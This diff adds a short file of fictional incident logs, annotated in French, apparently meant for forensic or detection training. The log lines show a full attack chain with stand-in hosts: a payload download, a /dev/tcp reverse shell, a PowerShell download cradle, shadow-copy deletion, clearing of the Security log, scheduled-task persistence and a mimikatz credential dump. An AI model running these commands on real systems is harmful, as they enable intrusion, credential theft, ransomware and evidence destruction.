@@ -1,0 +1,16 @@
+# Extrait fictif de journaux collectes pendant un incident (poste WKS-042)
+# Toutes les IP/domaines utilisent des plages de documentation (RFC 5737 / example.*)
+2026-11-12 08:14:02 sshd[1123]: Accepted password for admin from 203.0.113.45 port 51522
+2026-11-12 08:14:09 sshd[1123]: session opened for user admin from 10.0.4.17
+2026-11-12 08:15:33 bash[1201]: curl -s http://198.51.100.23/stage2.sh -o /tmp/x && chmod +x /tmp/x
+2026-11-12 08:15:40 bash[1201]: bash -c 'bash -i >& /dev/tcp/203.0.113.45/4444 0>&1'
+2026-11-12 08:16:01 kernel: rien de suspect sur cette ligne
+[EventID 4688] NewProcess: cmd.exe /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA
+[EventID 4104] ScriptBlock: IEX(New-Object Net.WebClient).DownloadString('https://update-cdn.example.net/a.ps1')
+[EventID 4688] NewProcess: vssadmin.exe Delete Shadows /all /quiet
+[EventID 4688] NewProcess: wevtutil.exe cl Security
+[EventID 4688] NewProcess: rundll32.exe C:\Users\Public\x.dll,DllRegister
+[EventID 4698] Task: schtasks /create /tn "Updater" /tr C:\Users\Public\u.exe /sc onlogon
+[EventID 10] lsass access by C:\Temp\m.exe -> sekurlsa::logonpasswords (mimikatz)
+proxy: 192.168.1.20 -> https://paste.example.org/raw/Zk3pQ
+note analyste : rancon demandee via le portail exemplexxxxxxxx.onion (adresse fictive)
